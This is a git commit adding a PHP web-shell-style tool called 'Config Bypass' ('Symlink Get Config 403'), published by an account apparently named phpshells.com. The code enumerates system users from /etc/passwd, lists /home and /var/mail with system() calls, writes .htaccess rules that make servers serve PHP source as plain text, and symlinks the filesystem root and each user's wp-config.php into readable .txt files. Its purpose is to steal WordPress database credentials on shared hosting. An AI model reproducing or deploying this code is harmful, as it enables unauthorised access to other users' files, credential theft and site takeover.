dfe6a84ce007dbe60b4d55a765dc3c1c5c5c9e6a
phpshells.com <75758434+phpshells-com@users.noreply.github.com>
2020-12-10 00:40:02 +0300

    Config Bypass
    Config Bypass

---
+++ configbypass.php
@@ -0,0 +1,392 @@
+<html>
+<head>
+<title>Symlink Get Config 403</title>
+<meta property="og:title" content="$ Achon666ju5t $"/> <meta property="og:description" content="./ 403"/>
+<link href="https://fonts.googleapis.com/css?family=Jockey+One" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Courier" rel="stylesheet">
+<style type="text/css">
+			
+			
+				body{	min-width: %100;
+
+						min-height: %100;
+
+						position: relative;
+
+						width: %100;
+
+						height: %100;
+
+						text-align: center;
+
+						margin: 0 auto;
+
+						padding: 5px;
+
+						background-color: #000000;
+
+						background-image: url(https://i.pinimg.com/originals/d8/9a/ac/d89aacd2020f889da078ded4b6942626.jpg);
+
+						background-repeat: no-repeat;
+
+						background-attachment: fixed;
+
+						background-size: 100% 100%;
+}
+																
+					#page{	min-width: %100;
+
+							min-height: %100;
+
+							position: relative;
+
+							width: %100;
+
+							height: %100;
+
+							text-align:center;
+
+							margin: 0 auto;
+
+							padding: 0px;
+}
+							
+						#header{min-width: %100;
+
+								min-height: %100;
+
+								position: relative;
+
+								width: %100;
+
+								height: auto;
+
+								text-align:center;
+
+								margin: 0 auto;
+
+								padding: 0px;
+
+								max-height: 125px;
+}
+							
+								div.flags img 		{ -webkit-transform:scale(1);
+ -moz-transform:scale(0.8);
+ -o-transform:scale(0.8);
+ -webkit-transition-duration: 0.5s;
+ -moz-transition-duration: 0.5s;
+ -o-transition-duration: 0.5s;
+ opacity: 0.9;
+ margin: 0 10px 5px 0;
+ }
+								div.flags img:hover { -webkit-transform:scale(1.5);
+ -moz-transform:scale(1.5);
+ -o-transform:scale(1.5);
+ box-shadow:0px 0px 30px black;
+ -webkit-box-shadow:0px 0px 30px black;
+ -moz-box-shadow:0px 0px 30px black;
+ opacity: 1;
+ }
+								div.flags p.flag img.fg { position: relative;
+ max-width: 80px;
+ max-height: 40px;
+ width: 100%;
+ height: auto;
+ margin: 0 auto;
+ padding: 0px;
+ }
+								div.flags p.flag1 img.ft { position: relative;
+ max-width: 630px;
+ max-height: 23px;
+ width: 100%;
+ height: auto;
+ margin: 0 auto;
+ padding: 0px;
+ }
+								div.flags p.flag td.fgt { padding-right: 10px;
+ padding-top: 0px;
+ padding-bottom: 0px;
+ margin: 0px;
+ }
+								div.flags p.flag1 td.ft { padding: 0px;
+ margin: 0px;
+ }
+							
+						#kaya { min-width: %100;
+
+								min-height: %100;
+
+								position: relative;
+
+								width: %100;
+
+								height: %100;
+
+								text-align:center;
+
+								margin: 0 auto;
+
+								padding: 0px;
+
+								max-height: 120px;
+}
+										
+										
+						#ekip { min-width: %100;
+
+								min-height: %100;
+
+								position: fixed;
+
+								width: %100;
+ 
+								height: auto;
+ 
+								padding: 1px;
+
+								bottom: 10px;
+
+								text-align: center;
+ 
+								margin: 0 auto;
+
+								right: 5px;
+ 
+								left: 5px;
+}
+											
+					
+									p.elogo{min-width: %100;
+
+											min-height: %100;
+
+											width: %100;
+ 
+											height: auto;
+
+											padding: 0px;
+
+											bottom: 15px;
+ 
+											text-align: center;
+ 
+											margin: 0 auto;
+}
+										
+											
+									p.euye {min-width: %100;
+
+											min-height: %100;
+
+											width: %100;
+ 
+											height: auto;
+
+											padding: 0px;
+
+											bottom: 15px;
+ 
+											text-align: center;
+ 
+											margin: 0 auto;
+}
+											
+											.rfacebook{position:fixed;
+ top:200px;
+ left:10px;
+ max-height:100px;
+ max-width:100px;
+ width: 100%;
+ height: auto;
+}
+											
+		</style></head>
+<body style="color: rgb(204, 0, 0);
+ background-color: rgb(0, 0, 0);
+" alink="#cc0000" link="#cc0000" vlink="#cc0000">
+<div style="border: 3px solid ;
+" align="center" dir="ltr"><span style="height: 0px;
+">
+
+
+
+<?php @error_reporting(0);
+ @ini_set('html_errors', 0);
+ @ini_set('max_execution_time', 0);
+ @ini_set('display_errors', 0);
+ @ini_set('file_uploads', 1);
+ echo '<div style=background:black;
+margin:0px;
+padding:4px;
+text-align:center;
+color:silver;
+></div><br>
+<form method="post">
+<center>
+<div style="text-align: center;
+"><big><span style="height: 0px;
+"><big style="font-family: AR CENA;
+"><span style="height: 0px;
+"><small><span style="height: 0px;
+"><span style="widows: 2;
+ text-transform: none;
+ text-indent: 0px;
+ white-space: normal;
+ orphans: 2;
+ letter-spacing: normal;
+ color: rgb(0, 0, 0);
+ word-spacing: 0px;
+ font-style: normal;
+ font-variant: normal;
+ font-weight: 700;
+" class="Apple-style-span"><span style="widows: 2;
+ text-transform: none;
+ text-indent: 0px;
+ font-style: normal;
+ font-variant: normal;
+ font-weight: normal;
+ font-size: medium;
+ line-height: normal;
+ font-size-adjust: none;
+ font-stretch: normal;
+ white-space: normal;
+ orphans: 2;
+ letter-spacing: normal;
+ color: rgb(0, 0, 0);
+ word-spacing: 0px;
+" class="Apple-style-span"><span style="widows: 2;
+ text-transform: none;
+ text-indent: 0px;
+ font-style: normal;
+ font-variant: normal;
+ font-weight: normal;
+ font-size: medium;
+ line-height: normal;
+ font-size-adjust: none;
+ font-stretch: normal;
+ white-space: normal;
+ orphans: 2;
+ letter-spacing: normal;
+ color: rgb(0, 0, 0);
+ word-spacing: 0px;
+" class="Apple-style-span"><font color="white" size="6"><big><span style="font-weight: bold;
+ text-shadow: white 0px 0px 12px;
+ color: white;
+"><span lang="en-us"><span style="color: white;
+"># Bypass</span> <span style="color: rgb(112, 0, 0);
+">403 !!<br><small><small><small><small><span style="color: white;
+">./</span></small></small></small></small><br></span></span></span></big></font></span></span></span><span style="widows: 2;
+ text-transform: none;
+ background-color: rgb(0, 0, 0);
+ text-indent: 0px;
+ white-space: normal;
+ orphans: 2;
+ letter-spacing: normal;
+ color: rgb(0, 0, 0);
+ word-spacing: 0px;
+ font-style: normal;
+ font-variant: normal;
+ font-weight: 700;
+" class="Apple-style-span"><span style="widows: 2;
+ text-transform: none;
+ background-color: rgb(0, 0, 0);
+ text-indent: 0px;
+ font-style: normal;
+ font-variant: normal;
+ font-weight: normal;
+ font-size: medium;
+ line-height: normal;
+ font-size-adjust: none;
+ font-stretch: normal;
+ white-space: normal;
+ orphans: 2;
+ letter-spacing: normal;
+ color: rgb(0, 0, 0);
+ word-spacing: 0px;
+" class="Apple-style-span"><span style="widows: 2;
+ text-transform: none;
+ text-indent: 0px;
+ font-style: normal;
+ font-variant: normal;
+ font-weight: normal;
+ font-size: medium;
+ line-height: normal;
+ font-size-adjust: none;
+ font-stretch: normal;
+ white-space: normal;
+ orphans: 2;
+ letter-spacing: normal;
+ color: rgb(0, 0, 0);
+ word-spacing: 0px;
+ background-color: rgb(0, 0, 0);
+" class="Apple-style-span"><font color="white" size="2"><big><span style="font-weight: bold;
+ text-shadow: white 0px 0px 12px;
+ color: white;
+"><span lang="en-us">
+<center><textarea style="color: white;
+background-color:#0000" cols="66" name="passwd" rows="18">';
+ $uSr = file("/etc/passwd");
+ foreach ($uSr as $usrr) { $str = explode(":", $usrr);
+ echo $str[0] . "
+";
+ } echo system('ls /var/mail');
+ echo system('ls /home');
+ echo '</textarea><br>
+Home : 
+<select name="home">
+<option title="home" value="home">home</option>
+<option title="home1" value="home1">home1</option>
+<option title="home2" value="home2">home2</option>
+<option title="home3" value="home3">home3</option>
+<option title="home4" value="home4">home4</option>
+<option title="home5" value="home5">home5</option>
+<option title="home6" value="home6">home6</option>
+<option title="home7" value="home7">home7</option>
+<option title="home8" value="home8">home8</option> 
+<option title="home9" value="home9">home9</option>
+<option title="home10" value="home10">home10</option> 
+</select><br>
+.htaccess : 
+<select name="achon666ju5t">
+<option title="biasa" value="Options Indexes FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+AddType txt .php
+AddHandler txt .php">Apache 1</option>
+<option title="Apache" value="Options all
+Options +Indexes 
+Options +FollowSymLinks 
+DirectoryIndex achon666ju5t.extremecrew
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None
+Satisfy Any">Apache 2</option>
+<option title="Litespeed" value=" 
+Options +FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+RemoveHandler .php
+AddType application/octet-stream .php ">Litespeed</option>
+</select>
+<input style="color:red;
+background-color:#FFFF" name="conf" size="10"
+ value="./Star 403" type="submit">
+<br/><br/></form>';
+ if ($_POST['conf']) { $home = $_POST['home'];
+ $folfig = $home;
+ @mkdir($folfig, 0755);
+ @chdir($folfig);
+ $htaccess = $_POST['achon666ju5t'];
+ file_put_contents(".htaccess", $htaccess, FILE_APPEND);
+ $passwd = explode("
+", $_POST["passwd"]);
+ foreach ($passwd as $pwd) { $user = trim($pwd);
+ symlink('/', '000~ROOT~000');
+ 
+symlink('/' . $home . '/' . $user . '/public_html/serahv/wp-config.php', $user . '1.txt');
+
+ } echo '<i><b><a href=' . $folfig . '>./Done</a></b></i></center>';
+ } 
+?>
+
+</td></table></body></html>
